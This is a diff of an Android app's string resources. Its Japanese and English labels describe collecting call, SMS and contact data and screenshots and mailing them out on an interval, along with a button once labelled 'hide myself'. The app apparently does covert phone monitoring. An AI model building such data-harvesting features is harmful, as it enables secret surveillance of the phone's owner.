@@ -47,11 +47,15 @@
     <string name="init_btn_getinfo">情報取得</string>
     <string name="init_btn_screenshot">スクリーンショット</string>
     <string name="init_btn_setting">設定</string>
-    <string name="init_btn_hide">自分を隠す</string>
+    <string name="init_btn_hide">戻る</string>
+    <string name="init_hint_getinfo">Get phonecall, SMS, contact information and send a mail</string>
+    <string name="init_hint_screenshot">Get a screenshot and send a mail</string>
+    <string name="init_hint_setting">Set username, serial number, mail address and interval</string>
+    <string name="init_hint_hide">Exit current setting dialog</string>
     
     <!-- License -->
-    <string name="licensed_yes">ライセンスを获得しました。ご使用ありがとう。</string>
-    <string name="licensed_no">間違うメールアドレスやパスワード</string>
+    <string name="licensed_yes">認証済み。ご使用ありがとう。</string>
+    <string name="licensed_no">間違うユーザ名やパスワード</string>
     <string name="pls_input_serial_num">シリアスナンバーをご入力ください</string>
     <string name="pls_input_mail">メールアドレスをご入力ください</string>
     <string name="pls_input_username">Please input user name</string>
